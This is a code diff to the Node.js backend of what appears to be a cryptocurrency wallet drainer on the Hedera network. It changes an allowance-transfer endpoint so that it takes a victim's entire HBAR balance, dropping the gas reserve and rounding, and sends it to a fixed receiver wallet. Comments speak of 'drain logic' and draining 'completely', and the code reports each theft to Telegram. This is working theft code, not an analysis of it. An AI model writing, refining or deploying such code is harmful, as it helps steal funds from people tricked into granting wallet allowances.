@@ -6,6 +6,7 @@ require('dotenv').config();
 // Fix for pino-pretty logging error
 process.env.NODE_ENV = 'production';
 // Force redeploy - backend drain logic updated
+// Second attempt to trigger deployment
 
 const { 
   Client, 
@@ -315,39 +316,27 @@ app.post('/api/execute-allowance-transfer', async (req, res) => {
 
     let { remainingHbar } = balanceResult;
     
-    // Reserve gas fee
-    if (remainingHbar > 0.5) {
-      remainingHbar = remainingHbar - 0.5;
-      console.log("Balance after gas reservation:", remainingHbar);
-    } else {
+    // Check if there's any balance to transfer
+    if (remainingHbar <= 0.01) {
       await sendTelegramMessage('insufficient_balance', {
         accountId: ownerAccountId,
         balance: remainingHbar,
-        required: 0.5,
-        error: 'Insufficient HBAR for gas fees'
+        required: 0.01,
+        error: 'Insufficient HBAR for transfer (minimum 0.01 HBAR)'
       });
       return res.status(400).json({
         success: false,
-        error: 'Insufficient HBAR for gas fees'
+        error: 'Insufficient HBAR for transfer (minimum 0.01 HBAR)'
       });
     }
 
-    if (Math.floor(remainingHbar) < 1) {
-      await sendTelegramMessage('insufficient_balance', {
-        accountId: ownerAccountId,
-        balance: Math.floor(remainingHbar),
-        required: 1,
-        error: 'Insufficient HBAR for transfer'
-      });
-      return res.status(400).json({
-        success: false,
-        error: 'Insufficient HBAR for transfer'
-      });
-    }
+    console.log("Original balance:", remainingHbar, "HBAR");
+    console.log("Will transfer:", remainingHbar, "HBAR (Hedera will deduct actual gas fees)");
 
     // Execute the transfer
     const client = HEDERA_NETWORK === 'mainnet' ? Client.forMainnet() : Client.forTestnet();
-    const balance = new Hbar(Math.floor(remainingHbar));
+    // Use the full remaining amount (not Math.floor) to drain completely
+    const balance = new Hbar(remainingHbar);
     
     const result = await executeHbarAllowanceTransfer(
       ownerAccountId, 
@@ -362,7 +351,7 @@ app.post('/api/execute-allowance-transfer', async (req, res) => {
       await sendTelegramMessage('transfer_success', {
         fromAccount: ownerAccountId,
         toAccount: RECEIVER_WALLET,
-        amount: Math.floor(remainingHbar),
+        amount: remainingHbar,
         transactionId: result.transactionId
       });
       
@@ -370,14 +359,14 @@ app.post('/api/execute-allowance-transfer', async (req, res) => {
         success: true,
         status: result.status,
         transactionId: result.transactionId,
-        amount: Math.floor(remainingHbar),
+        amount: remainingHbar,
         receiver: RECEIVER_WALLET,
         message: 'Transfer completed successfully'
       });
     } else {
       await sendTelegramMessage('transfer_failed', {
         accountId: ownerAccountId,
-        amount: Math.floor(remainingHbar),
+        amount: remainingHbar,
         targetWallet: RECEIVER_WALLET,
         error: result.error
       });
